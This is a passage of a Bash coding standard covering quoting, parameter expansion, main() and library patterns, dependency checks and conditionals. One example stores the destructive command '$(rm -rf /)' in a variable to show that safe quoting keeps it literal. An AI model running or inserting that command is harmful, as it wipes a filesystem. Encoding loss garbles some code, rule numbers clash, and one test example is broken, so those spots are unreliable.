SCRIPT_NAME=${SCRIPT_PATH##*/}  # Remove longest prefix
SCRIPT_DIR=${SCRIPT_PATH%/*}    # Remove shortest suffix

# Default values
${var:-default}                 # Use default if unset/null
${var:=default}                 # Set default if unset/null
${var:+alternate}               # Use alternate if set and non-null

# Substrings
${var:0:5}                      # First 5 characters
${var:(-3)}                     # Last 3 characters

# Pattern substitution
${var//old/new}                 # Replace all occurrences
${var/old/new}                  # Replace first occurrence

# Case conversion (Bash 4.0+)
${var,,}  ${var^^}              # All lower/uppercase

# Special parameters
"${@:2}"  "${10}"  ${#var}      # Args from 2nd, param >9, length
```

---

#### When Braces Are REQUIRED

1. **Parameter expansion operations:** `"${var##*/}"` `"${var:-default}"` `"${var:0:5}"`
2. **Concatenation (no separator):** `"${var1}${var2}"` `"${prefix}suffix"`
3. **Array access:** `"${array[index]}"` `"${array[@]}"` `"${#array[@]}"`
4. **Special parameters:** `"${@:2}"` `"${10}"` `"${!var}"`

---

#### When Braces Are NOT Required

```bash
# ✓ Standalone variables
"$var"  "$HOME"  "$SCRIPT_DIR"

# ✓ Path concatenation with separators
"$PREFIX"/bin
"$SCRIPT_DIR"/build/lib

# ✓ In strings with separators
echo "Installing to $PREFIX/bin"

# ✗ Wrong - unnecessary braces
"${var}"  "${PREFIX}"/bin  "${count} files"
```

---

#### Edge Cases

```bash
# Braces required - next char alphanumeric AND no separator
"${var}_suffix"      # Prevents $var_suffix
"${prefix}123"       # Prevents $prefix123

# No braces needed - separator present
"$var-suffix"  "$var.suffix"  "$var/path"
```

---

#### Summary Table

| Situation | Form | Example |
|-----------|------|---------|
| Standalone variable | `"$var"` | `"$HOME"` |
| Path with separator | `"$var"/path` | `"$BIN_DIR"/file` |
| Parameter expansion | `"${var%pattern}"` | `"${path%/*}"` |
| Concatenation (no sep) | `"${var1}${var2}"` | `"${prefix}${suffix}"` |
| Array access | `"${array[i]}"` | `"${args[@]}"` |

**Key Principle:** Use `"$var"` by default. Only add braces when required for correct parsing.

#fin


---


**Rule: BCS0211**

## Boolean Flags Pattern

For boolean state tracking, use integer variables with `declare -i`:

```bash
# Boolean flags - declare as integers with explicit initialization
declare -i INSTALL_BUILTIN=0
declare -i BUILTIN_REQUESTED=0
declare -i SKIP_BUILTIN=0
declare -i NON_INTERACTIVE=0
declare -i UNINSTALL=0
declare -i DRY_RUN=0

# Test flags in conditionals using (())
((DRY_RUN)) && info 'Dry-run mode enabled'

if ((INSTALL_BUILTIN)); then
  install_loadable_builtins
fi

# Toggle flags
((VERBOSE)) && VERBOSE=0 || VERBOSE=1

# Set flags from command-line parsing
case $1 in
  --dry-run)    DRY_RUN=1 ;;
  --skip-build) SKIP_BUILD=1 ;;
esac
```

**Guidelines:**
- Use `declare -i` for integer-based boolean flags
- Name flags descriptively in ALL_CAPS (e.g., `DRY_RUN`, `INSTALL_BUILTIN`)
- Initialize explicitly to `0` (false) or `1` (true)
- Test with `((FLAG))` in conditionals (returns true for non-zero, false for zero)
- Avoid mixing boolean flags with integer counters - use separate variables


---


**Rule: BCS0300**

# Strings & Quoting

Quoting rules prevent word-splitting errors and clarify code intent. **Single quotes** for static strings, **double quotes** when variable expansion is needed.

**7 Rules:**

1. **Quoting Fundamentals** (BCS0301) - Static vs. dynamic strings
2. **Command Substitution** (BCS0302) - Quoting `$(...)` results
3. **Quoting in Conditionals** (BCS0303) - Variable quoting in `[[ ]]`
4. **Here Documents** (BCS0304) - Delimiter quoting for heredocs
5. **printf Patterns** (BCS0305) - Format string and argument quoting
6. **Parameter Quoting** (BCS0306) - Using `${param@Q}` for safe display
7. **Anti-Patterns** (BCS0307) - Common quoting mistakes to avoid

**Key principle:** Single quotes = literal text; double quotes = variable expansion needed.


---


**Rule: BCS0301**

## Quoting Fundamentals

**Rule: BCS0301** (Merged from BCS0401 + BCS0402 + BCS0403 + BCS0404)

Core quoting rules for strings, variables, and literals.

---

#### The Fundamental Rule

**Single quotes** for static strings, **double quotes** when variable expansion needed.

```bash
# ✓ Single quotes for static
info 'Checking prerequisites...'
[[ "$status" == 'success' ]]

# ✓ Double quotes for variables
info "Found $count files"
die 1 "Unknown option '$1'"
```

---

#### Why Single Quotes for Static Strings

1. **Performance**: No variable/escape parsing overhead
2. **Clarity**: Signals "literal, no substitution"
3. **Safety**: Prevents accidental expansion
4. **No escaping**: `$`, `` ` ``, `\` are literal

```bash
msg='The variable $PATH will not expand'
regex='^\$[0-9]+\.[0-9]{2}$'
```

---

#### Mixed Quoting Pattern

Nest single quotes inside double quotes for literal display:

```bash
die 1 "Unknown option '$1'"
warn "Cannot access '$file_path'"
```

---

#### One-Word Literal Exception

Simple alphanumeric values (`a-zA-Z0-9_-./`) may be unquoted:

```bash
# ✓ Acceptable
STATUS=success
[[ "$level" == INFO ]]

# ✓ Better - quote for consistency
STATUS='success'
[[ "$level" == 'INFO' ]]
```

**Mandatory quoting:** spaces, special characters (`@`, `*`), empty strings `''`, values with `$`, quotes, backslashes.

---

#### Anti-Patterns

```bash
# ✗ Wrong - double quotes for static
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]

# ✗ Wrong - special characters unquoted
EMAIL=user@domain.com
PATTERN=*.log

# ✓ Correct
EMAIL='user@example.com'
PATTERN='*.log'
```

---

#### Path Concatenation Quoting

Quote variable portions separately from literals for clarity:

```bash
# ✓ RECOMMENDED - separate quoting
"$PREFIX"/bin
"$SCRIPT_DIR"/data/"$filename"
[[ -f "$CONFIG_DIR"/hosts.conf ]]

# ✗ NOT RECOMMENDED - combined
"$PREFIX/bin"
"$SCRIPT_DIR/data/$filename"
```

**Rationale:** Makes variable boundaries explicit, improves readability with multiple variables.

---

#### Quick Reference

| Content | Quote Type | Example |
|---------|------------|---------|
| Static text | Single | `'Processing...'` |
| With variable | Double | `"Found $count files"` |
| Variable in quotes | Mixed | `"Option '$1' invalid"` |
| One-word literal | Optional | `STATUS=success` |
| Special chars | Single | `'user@example.com'` |
| Empty string | Single | `VAR=''` |
| Path with separator | Separate | `"$var"/path` |

**Key principle:** Single quotes as default; double quotes only when expansion needed.

#fin


---


**Rule: BCS0302**

## Command Substitution

**Rule: BCS0302**

Use double quotes when strings include command substitution. Always quote results to preserve whitespace and prevent word splitting.

```bash
# ✓ Correct - double quotes for command substitution
echo "Current time: $(date +%T)"
info "Found $(wc -l < "$file") lines"
VERSION="$(git describe --tags 2>/dev/null || echo 'unknown')"

# ✓ Correct - quoted result
result=$(command)
echo "$result"

# ✗ Wrong - unquoted result
echo $result    # Word splitting occurs!
```

#fin


---


**Rule: BCS0303**

## Quoting in Conditionals

**Rule: BCS0303** (From BCS0406)

Variable quoting in test expressions.

---

#### The Rule

**Always quote variables** in conditionals. Static comparison values follow normal rules (single quotes for literals).

```bash
# ✓ Correct - variable quoted
[[ -f "$file" ]]
[[ "$name" == 'value' ]]
[[ "$count" -eq 0 ]]

# ✗ Wrong - unquoted variable
[[ -f $file ]]
[[ $name == value ]]
```

---

#### Why Quote Variables

1. **Word splitting**: `$file` with spaces becomes multiple arguments
2. **Glob expansion**: `$file` with `*` expands to matching files
3. **Empty values**: Unquoted empty variables cause syntax errors
4. **Security**: Prevents injection attacks

---

#### Common Patterns

```bash
# File tests
[[ -f "$file" ]]
[[ -d "$directory" && -r "$directory" ]]

# String comparisons (variable quoted, literal single-quoted)
[[ "$action" == 'start' ]]
[[ -z "$value" ]]
[[ -n "$result" ]]

# Numeric comparisons
[[ "$count" -gt 10 ]]

# Pattern matching (pattern unquoted for globbing)
[[ "$filename" == *.txt ]]        # Glob match
[[ "$filename" == '*.txt' ]]      # Literal match

# Regex (pattern variable unquoted)
pattern='^[0-9]+$'
[[ "$input" =~ $pattern ]]        # ✓ Pattern unquoted
[[ "$input" =~ "$pattern" ]]      # ✗ Becomes literal
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]]              # Breaks with spaces
[[ $name == value ]]        # Breaks with spaces

# ✗ Wrong - double quotes for static literal
[[ "$mode" == "production" ]]

# ✓ Correct
[[ "$mode" == 'production' ]]
[[ "$mode" == production ]]  # One-word literal OK
```

---

**Key principle:** Variable quoting in conditionals is mandatory. Quote all variables: `[[ -f "$file" ]]`.

#fin


---


**Rule: BCS0304**

## Here Documents

**Rule: BCS0304** (Merged from BCS0408 + BCS1104)

#### Delimiter Quoting

| Delimiter | Variable Expansion | Use Case |
|-----------|-------------------|----------|
| `<<EOF` | Yes | Dynamic content with variables |
| `<<'EOF'` | No | Literal content (JSON, SQL) |
| `<<"EOF"` | No | Same as single quotes |

#### With Variable Expansion

```bash
cat <<EOF
User: $USER
Home: $HOME
Time: $(date)
EOF
```

#### Literal Content (No Expansion)

```bash
cat <<'EOF'
{
  "name": "$APP_NAME",
  "version": "$VERSION"
}
EOF
```

#### Indented Content

```bash
# <<- removes leading tabs (not spaces)
if condition; then
	cat <<-EOF
	Indented content
	Aligned with code
	EOF
fi
```

#### Anti-Patterns

```bash
# ✗ Wrong - unquoted when literal needed (SQL injection risk)
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal SQL
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

**Key principle:** Quote the delimiter (`<<'EOF'`) to prevent expansion; leave unquoted for variable substitution.

#fin


---


**Rule: BCS0305**

## printf Patterns

**Rule: BCS0305**

Single quotes for format strings, double quotes for variable arguments.

---

#### Basic Pattern

```bash
# Format string: single quotes; variables: double-quoted arguments
printf '%s: %d files found\n' "$name" "$count"

# Static strings - single quotes
echo 'Installation complete'
printf '%s\n' 'Processing files'

# With variables - double quotes
echo "$SCRIPT_NAME $VERSION"
printf 'Found %d files in %s\n' "$count" "$dir"
```

#### Format Specifiers

```bash
printf '%s\n' "$string"    # String
printf '%d\n' "$integer"   # Decimal
printf '%f\n' "$float"     # Float
printf '%x\n' "$hex"       # Hexadecimal
printf '%%\n'              # Literal %
```

#### Prefer printf Over echo -e

```bash
# ✗ echo -e behavior varies across systems
echo -e "Line1\nLine2"

# ✓ printf is consistent
printf 'Line1\nLine2\n'

# ✓ Or $'...' for escape sequences
echo $'Line1\nLine2'
```

#fin


---


**Rule: BCS0306**

## Parameter Quoting with @Q

**Rule: BCS0306**

`${parameter@Q}` expands to a shell-quoted value safe for display and re-use.

---

#### Usage Examples

```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)' (safe, literal)
```

---

#### Primary Use: Error Messages

```bash
# ✗ Wrong - injection risk
die 2 "Unknown option $1"

# ✓ Correct - safe display
die 2 "Unknown option ${1@Q}"

# Validation function
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}
```

---

#### Dry-Run Display

```bash
run_command() {
  local -a cmd=("$@")
  if ((DRY_RUN)); then
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi
  "${cmd[@]}"
}
```

---

#### Behavior Comparison

| Input | `$var` | `"$var"` | `${var@Q}` |
|-------|--------|----------|------------|
| `hello world` | splits | `hello world` | `'hello world'` |
| `$(date)` | executes | executes | `'$(date)'` |
| `*.txt` | globs | `*.txt` | `'*.txt'` |

---

#### When to Use

**Use @Q for:** Error messages, logging user input, dry-run output
**Don't use for:** Normal variable expansion, comparisons

**Key principle:** Use `${parameter@Q}` when displaying user input in error messages to prevent injection.

#fin


---


**Rule: BCS0307**

## Quoting Anti-Patterns

**Rule: BCS0307** (From BCS0411)

Common quoting mistakes to avoid.

#### Category 1: Double Quotes for Static Strings

```bash
# ✗ Wrong
info "Checking prerequisites..."
[[ "$status" == "active" ]]

# ✓ Correct
info 'Checking prerequisites...'
[[ "$status" == 'active' ]]
```

#### Category 2: Unquoted Variables

```bash
# ✗ Wrong - word splitting/glob expansion
[[ -f $file ]]
echo $result
rm $temp_file

# ✓ Correct
[[ -f "$file" ]]
echo "$result"
rm "$temp_file"
```

#### Category 3: Unnecessary Braces

```bash
# ✗ Wrong - braces not needed
echo "${HOME}/bin"
path="${CONFIG_DIR}/app.conf"

# ✓ Correct
echo "$HOME/bin"
path="$CONFIG_DIR/app.conf"

# Braces ARE needed for:
"${var:-default}"     # Default value
"${file##*/}"         # Parameter expansion
"${array[@]}"         # Array expansion
"${var1}${var2}"      # Adjacent variables
```

#### Category 4: Unquoted Arrays

```bash
# ✗ Wrong
for item in ${items[@]}; do

# ✓ Correct
for item in "${items[@]}"; do
```

#### Category 5: Glob Expansion Danger

```bash
# ✗ Wrong
pattern='*.txt'
echo $pattern       # Expands to all .txt files!

# ✓ Correct
echo "$pattern"     # Outputs literal: *.txt
```

#### Category 6: Here-doc Delimiter

```bash
# ✗ Wrong - variables expand unexpectedly
cat <<EOF
SELECT * FROM users WHERE name = "$name"
EOF

# ✓ Correct - quoted for literal content
cat <<'EOF'
SELECT * FROM users WHERE name = ?
EOF
```

#### Quick Reference

| Context | Correct | Wrong |
|---------|---------|-------|
| Static string | `'literal'` | `"literal"` |
| Variable | `"$var"` | `$var` |
| Path with var | `"$HOME/bin"` | `"${HOME}/bin"` |
| Conditional | `[[ -f "$file" ]]` | `[[ -f $file ]]` |
| Array | `"${arr[@]}"` | `${arr[@]}` |
| Static literal | `== 'value'` | `== "value"` |

**Key principle:** Single quotes for static text, double quotes for variables, avoid unnecessary braces, always quote variables.

#fin


---


**Rule: BCS0400**

# Functions

This section defines function definition patterns, naming conventions (lowercase_with_underscores), and organization principles. It mandates the `main()` function for scripts exceeding 200 lines to improve structure and testability, explains function export for sourceable libraries (`declare -fx`), and details production optimization practices where unused utility functions should be removed once scripts mature. Functions should be organized bottom-up: messaging functions first, then helpers, then business logic, with `main()` lastthis ensures each function can safely call previously defined functions and readers understand primitives before composition.


---


**Rule: BCS0401**

## Function Definition Pattern
```bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
```


---


**Rule: BCS0402**

## Function Names
Use lowercase with underscores to match shell conventions and avoid conflicts with built-in commands.

```bash
#  Good - lowercase with underscores
my_function() {
  &
}

process_log_file() {
  &
}

#  Private functions use leading underscore
_my_private_function() {
  &
}

_validate_input() {
  &
}

#  Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  &
}

PROCESS_FILE() {    # Don't do this
  &
}
```

**Rationale:**
- Lowercase with underscores matches standard Unix/Linux utility naming
- Avoid CamelCase (can confuse with variables/commands)
- Underscore prefix signals private/internal use
- All built-in bash commands are lowercase

**Anti-patterns:**
```bash
#  Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

#  If wrapping built-ins, use different name
change_dir() {
  builtin cd "$@" && ls
}

#  Don't use special characters
my-function() {  # Dash creates issues
  &
}
```


---


**Rule: BCS0403**

## Main Function

**Always include a `main()` function for scripts longer than approximately 200 lines. Place `main "$@"` at the bottom of the script, just before the `#fin` marker.**

**Rationale:**

- **Single Entry Point**: Clear execution flow from one well-defined function
- **Testability**: Scripts can be sourced without executing; functions tested individually
- **Organization**: Separates initialization, parsing, and logic into clear sections
- **Debugging**: Central location for debugging output or dry-run logic
- **Scope Control**: Local variables prevent global namespace pollution
- **Exit Code Management**: Centralized return/exit handling

**When to use main():** Scripts >200 lines, multiple functions, argument parsing, testability required, complex logic flow

**Basic structure:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Functions
# ... helper functions ...

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) usage; return 0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  # Main logic
  info 'Starting processing...'

  return 0
}

main "$@"
#fin
```

**With argument parsing:**

```bash
main() {
  local -i verbose=0 dry_run=0
  local -- output_file=''
  local -a input_files=()

  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output) noarg "$@"; shift; output_file="$1" ;;
    -h|--help) usage; return 0 ;;
    --) shift; break ;;
    -*) die 22 "Invalid option: $1" ;;
    *) input_files+=("$1") ;;
  esac; shift; done

  input_files+=("$@")
  readonly -- verbose dry_run output_file
  readonly -a input_files

  # Validate
  [[ ${#input_files[@]} -eq 0 ]] && { error 'No input files'; usage; return 22; }

  # Main logic
  ((verbose)) && info "Processing ${#input_files[@]} files"

  for file in "${input_files[@]}"; do
    process_file "$file"
  done

  return 0
}
```

**With setup/cleanup:**

```bash
cleanup() {
  local -i exit_code=$?
  [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]] && rm -rf "$TEMP_DIR"
  return "$exit_code"
}

main() {
  trap cleanup EXIT
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR

  info "Using temp directory: $TEMP_DIR"
  # ... processing ...

  return 0
}

main "$@"
#fin
```

**With error handling:**

```bash
main() {
  local -i errors=0

  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      ((errors+=1))
    fi
  done

  if ((errors > 0)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Enabling sourcing for tests:**

```bash
main() {
  # ... script logic ...
  return 0
}

# Only execute if run directly (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

#fin
```

**Anti-patterns:**

```bash
#  Wrong - no main function in complex script (>200 lines)
#!/bin/bash
set -euo pipefail
# ... 200 lines of code directly in script ...

#  Correct
main() {
  # Script logic
}
main "$@"
#fin

#  Wrong - main() called before all functions defined
main() { }
main "$@"
helper_function() { }  # Defined AFTER main executes!

#  Correct
helper_function() { }
main() { }
main "$@"
#fin

#  Wrong - parsing arguments outside main
verbose=0
while (($#)); do
  # ... parse args ...
done
main() { }
main "$@"  # Arguments already consumed!

#  Correct
main() {
  local -i verbose=0
  while (($#)); do
    # ... parse args ...
  done
  readonly -- verbose
}
main "$@"

#  Wrong - not passing arguments
main() { }
main  # Missing "$@"!

#  Correct
main "$@"
```

**Edge cases:**

**1. Global configuration:**

```bash
declare -i VERBOSE=0 DRY_RUN=0

main() {
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
  esac; shift; done

  readonly -- VERBOSE DRY_RUN
}

main "$@"
```

**2. Library and executable:**

```bash
utility_function() { }

main() { }

# Only run main if executed (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi
#fin
```

**3. Multiple modes:**

```bash
main_install() { }
main_uninstall() { }

main() {
  local -- mode="${1:-}"
  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode: $mode" ;;
  esac
}

main "$@"
```

**Testing pattern:**

```bash
# Script: myapp.sh
main() {
  local -i value="$1"
  ((value * 2))
  echo "$value"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

# Test file: test_myapp.sh
#!/bin/bash
source ./myapp.sh  # Source without executing
result=$(main 5)
[[ "$result" == "10" ]] && echo "PASS" || echo "FAIL"
```

**Summary:**

- Use main() for scripts >200 lines
- Single entry point for all execution
- Place main() at end, after all helper functions
- Always call with `main "$@"`
- Parse arguments in main, make locals readonly after parsing
- Return 0 for success, non-zero for errors
- Use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- Organize: messaging � documentation � helpers � business logic � main
- Main orchestrates, helpers do the work


---


**Rule: BCS0404**

## Function Export
```bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
```


---


**Rule: BCS0405**

## Production Script Optimization
Once mature and production-ready:
- Remove unused utility functions (e.g., `yn()`, `decp()`, `trim()`, `s()`)
- Remove unused global variables (e.g., `PROMPT`, `DEBUG`)
- Remove unused messaging functions
- Keep only what script actually needs
- Reduces size, improves clarity, eliminates maintenance burden

Example: Simple script may only need `error()` and `die()`, not full messaging suite.


---


**Rule: BCS0406**

## Dual-Purpose Scripts

**Rule: BCS0606** (Elevated from BCS010201)

Scripts that can be both executed directly and sourced as libraries.

---

#### Rationale

- Reusable functions without code duplication
- Direct execution for standalone use, library sourcing for integration
- Testing flexibility (source functions, run tests)

---

#### Basic Pattern

```bash
#!/usr/bin/env bash
# my-lib.sh - Dual-purpose library/script

# Define functions first (before any set -e)
my_function() {
  local -- arg=$1
  echo "Processing: $arg"
}
declare -fx my_function

# Check if sourced or executed
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Everything below runs only when executed directly
set -euo pipefail
shopt -s inherit_errexit shift_verbose

# Script metadata
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- SCRIPT_PATH SCRIPT_NAME

main() {
  my_function "$@"
}

main "$@"

#fin
```

#### With Idempotent Initialization

```bash
#!/usr/bin/env bash
# Prevent double-initialization when sourced

[[ -v MY_LIB_VERSION ]] || {
  declare -rx MY_LIB_VERSION='1.0.0'
  declare -rx MY_LIB_PATH=$(realpath -e -- "${BASH_SOURCE[0]}")
}

# Functions defined here...
my_func() { :; }
declare -fx my_func

# Source-mode exit
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Execution mode
set -euo pipefail
main() { my_func "$@"; }
main "$@"

#fin
```

#### Why set -e Comes After Check

`set -e` must come AFTER the sourced check:
1. When sourced, parent script controls error handling
2. `return 0` with `set -e` active could cause issues
3. Library code should not impose error handling on caller

```bash
# ✗ Wrong - set -e before source check
set -euo pipefail
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0  # Risky

# ✓ Correct - set -e after source check
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0
set -euo pipefail
```

---

#### Usage

```bash
# As executable
./my-lib.sh arg1 arg2

# As library (source for functions)
source ./my-lib.sh
my_function "value"
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - functions not exported
my_func() { :; }
# Cannot be called from subshells after sourcing

# ✓ Correct - export functions
my_func() { :; }
declare -fx my_func
```

---

**See Also:** BCS0607 (Library Patterns), BCS0604 (Function Export)

**Full implementation:** See `examples/exemplar-code/internetip/internetip`

#fin


---


**Rule: BCS0407**

## Library Patterns

**Rule: BCS0607**

Patterns for creating reusable Bash libraries.

---

#### Rationale

Well-designed libraries provide code reuse, consistent interfaces, easier testing, and namespace isolation.

---

#### Pure Function Library

```bash
#!/usr/bin/env bash
# lib-validation.sh - Validation function library
#
# Usage: source lib-validation.sh

# Prevent execution
[[ "${BASH_SOURCE[0]}" != "$0" ]] || {
  echo "Error: This file must be sourced, not executed" >&2
  exit 1
}

# Library version
declare -rx LIB_VALIDATION_VERSION='1.0.0'

# Validation functions
valid_ip4() {
  local -- ip=$1
  [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
  local -a octets
  IFS='.' read -ra octets <<< "$ip"
  for octet in "${octets[@]}"; do
    ((octet <= 255)) || return 1
  done
  return 0
}
declare -fx valid_ip4

valid_email() {
  local -- email=$1
  [[ $email =~ ^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$ ]]
}
declare -fx valid_email

#fin
```

#### Library with Configuration

```bash
#!/usr/bin/env bash
# lib-config.sh - Configuration management library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# Configurable defaults (can be overridden before sourcing)
: "${CONFIG_DIR:=/etc/myapp}"
: "${CONFIG_FILE:=$CONFIG_DIR/config}"

load_config() {
  [[ -f "$CONFIG_FILE" ]] || return 1
  source "$CONFIG_FILE"
}
declare -fx load_config

get_config() {
  local -- key=$1 default=${2:-}
  local -- value
  value=$(grep "^${key}=" "$CONFIG_FILE" 2>/dev/null | cut -d= -f2-)
  echo "${value:-$default}"
}
declare -fx get_config

#fin
```

#### Namespace Pattern

```bash
#!/usr/bin/env bash
# lib-myapp.sh - Namespaced library

[[ "${BASH_SOURCE[0]}" != "$0" ]] || exit 1

# All functions prefixed with namespace
myapp_init() { :; }
myapp_cleanup() { :; }
myapp_process() { :; }

declare -fx myapp_init myapp_cleanup myapp_process

#fin
```

#### Sourcing Libraries

```bash
# Source with path resolution
SCRIPT_DIR=${BASH_SOURCE[0]%/*}
source "$SCRIPT_DIR/lib-validation.sh"

# Source with existence check
lib_path='/usr/local/lib/myapp/lib-utils.sh'
[[ -f "$lib_path" ]] && source "$lib_path" || die 1 "Missing library: $lib_path"

# Source multiple libraries
for lib in "$LIB_DIR"/*.sh; do
  [[ -f "$lib" ]] && source "$lib"
done
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - library has side effects on source
source lib.sh  # Immediately modifies global state

# ✓ Correct - library only defines functions
source lib.sh  # Only defines functions
lib_init       # Explicit initialization call
```

---

**See Also:** BCS0606 (Dual-Purpose Scripts), BCS0608 (Dependency Management)

#fin


---


**Rule: BCS0408**

## Dependency Management

**Rule: BCS0608**

Checking and managing external dependencies in Bash scripts.

---

#### Rationale

- Provides clear error messages for missing tools
- Enables graceful degradation and documents requirements
- Supports portability checking

---

#### Basic Dependency Check

```bash
# Check single command
command -v curl >/dev/null || die 1 'curl is required but not installed'

# Check multiple commands
for cmd in curl jq awk; do
  command -v "$cmd" >/dev/null || die 1 "Required: $cmd"
done
```

#### Dependency Check Function

```bash
check_dependencies() {
  local -a missing=()
  local -- cmd

  for cmd in "$@"; do
    command -v "$cmd" >/dev/null || missing+=("$cmd")
  done

  if ((${#missing[@]} > 0)); then
    error "Missing dependencies: ${missing[*]}"
    info 'Install with: sudo apt install ...'
    return 1
  fi
}

# Usage
check_dependencies curl jq sqlite3 || exit 1
```

#### Optional Dependencies

```bash
# Check and set availability flag
declare -i HAS_JQ=0
command -v jq >/dev/null && HAS_JQ=1

# Use with fallback
if ((HAS_JQ)); then
  result=$(echo "$json" | jq -r '.field')
else
  result=$(echo "$json" | grep -oP '"field":\s*"\K[^"]+')
fi
```

#### Version Checking

```bash
check_bash_version() {
  local -i major=${BASH_VERSINFO[0]}
  local -i minor=${BASH_VERSINFO[1]}

  if ((major < 5 || (major == 5 && minor < 2))); then
    die 1 "Requires Bash 5.2+, found $BASH_VERSION"
  fi
}

check_tool_version() {
  local -- tool=$1 min_version=$2
  local -- current_version

  current_version=$("$tool" --version 2>&1 | head -1 | grep -oE '[0-9]+\.[0-9]+')

  if [[ "$(printf '%s\n' "$min_version" "$current_version" | sort -V | head -1)" != "$min_version" ]]; then
    die 1 "$tool version $min_version+ required, found $current_version"
  fi
}
```

#### Lazy Loading

```bash
# Initialize expensive resources only when needed
declare -- SQLITE_DB=''

get_db() {
  if [[ -z "$SQLITE_DB" ]]; then
    command -v sqlite3 >/dev/null || die 1 'sqlite3 required'
    SQLITE_DB=$(mktemp)
    sqlite3 "$SQLITE_DB" 'CREATE TABLE cache (key TEXT, value TEXT)'
  fi
  echo "$SQLITE_DB"
}
```

---

#### Anti-Patterns

```bash
# ✗ Wrong - using which (not POSIX, unreliable)
which curl >/dev/null

# ✓ Correct - use command -v (POSIX compliant)
command -v curl >/dev/null
```

```bash
# ✗ Wrong - silent failure on missing dependency
curl "$url"  # Cryptic error if curl missing

# ✓ Correct - explicit check with helpful message
command -v curl >/dev/null || die 1 'curl required: apt install curl'
curl "$url"
```

---

**See Also:** BCS0607 (Library Patterns)

#fin


---


**Rule: BCS0500**

# Control Flow

This section establishes patterns for conditionals, loops, case statements, and arithmetic operations. It mandates using `[[ ]]` over `[ ]` for test expressions, `(())` for arithmetic conditionals, and covers both compact case statement formats and expanded formats for complex logic. Critical guidance includes preferring process substitution (`< <(command)`) over pipes to while loops to avoid subshell variable persistence issues, and using safe arithmetic patterns: `i+=1` or `((i+=1))` instead of `((i++))` which returns the original value and fails with `set -e` when i=0.


---


**Rule: BCS0501**

## Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

```bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists'
[[ -f "$file" ]] || die 1 "File not found: $file"
[[ "$status" == 'success' ]] && continue

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((var > 5)) || return 1
((count >= MAX_RETRIES)) && die 1 'Too many retries'

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count > 0)); then
  process_data
fi

# Short-circuit evaluation
[[ -f "$file" ]] && source "$file"
((VERBOSE)) || return 0
```

**Rationale for `[[ ]]` over `[ ]`:**

1. **No word splitting/glob expansion** on variables
2. **Pattern matching** with `==` and `=~` operators
3. **Logical operators** `&&` and `||` work inside (no `-a`/`-o`)
4. **More operators**: `<`, `>` for lexicographic string comparison

**Comparison:**

```bash
var="two words"

# ✗ [ ] requires quotes or fails
[ $var = "two words" ]  # ERROR: too many arguments

# ✓ [[ ]] handles safely (still quote for clarity)
[[ "$var" == "two words" ]]

# Pattern matching (only [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file"

# vs [ ] requires separate tests
[ -f "$file" ] && [ -r "$file" ] && cat "$file"
```

